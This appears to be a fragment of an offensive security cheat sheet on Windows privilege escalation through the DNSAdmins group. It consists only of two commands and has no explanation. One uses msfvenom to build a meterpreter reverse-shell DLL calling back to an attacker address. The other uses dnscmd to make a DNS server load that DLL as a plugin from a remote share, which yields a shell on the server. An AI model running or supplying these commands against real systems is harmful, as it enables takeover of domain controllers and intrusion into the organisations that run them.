### Sensitive Groups Privilege Escalation

### # DNSAdmins
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.1 LPORT=7777 -f dll -o DNSAdmins.dll
dnscmd.exe john.insomnia /config /serverlevelplugindll \\192.168.100.1:8080\DNSAdmins.dll
```
